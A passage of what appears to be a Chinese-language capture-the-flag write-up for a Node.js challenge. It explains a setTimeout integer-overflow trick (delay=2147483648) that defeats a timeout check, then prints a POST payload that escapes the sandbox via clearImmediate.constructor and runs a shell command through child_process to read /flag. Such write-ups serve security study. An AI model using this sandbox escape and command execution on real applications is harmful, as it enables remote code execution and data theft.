2.setTimeout()函数int溢出

想进行我们邪恶的/eval，还得绕过一个超时判定，即下面的代码

if (req.path === '/eval') {
    ... //此处省略
}

这里对于query(GET)到的参数delay与原先的delay做了一个取最大值的操作，原先的delay=60 * 1000。

if (Number.isInteger(parseInt(req.query.delay))) {
      delay = Math.max(delay, parseInt(req.query.delay));
    }

但是这里的下面的一个函数存在漏洞，故而可以绕过这个Timeout继续向下执行

const t = setTimeout(() => next(), delay);
    // 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事
    setTimeout(() => {
      clearTimeout(t);
      console.log('timeout');
      try {
        res.send('Timeout!');
      } catch (e) {

      }
    }, 1000);

限制时间不超过1000，单位应该是1000ms吧!所以用下面的知识绕过

就是我们传入的delay如果二进制大小超过32位（2147483647即2^31-1，<因为有符号位>），会被settimeout设为1，这样就满足条件了

3.payload

/eval?delay=2147483648

#POST
e=(function () {

4.flag

将POST内容改为

e=(function () {
  const process = clearImmediate.constructor("return process;")();
  return process.mainModule.require("child_process").execSync("cat /flag").toString()
})()
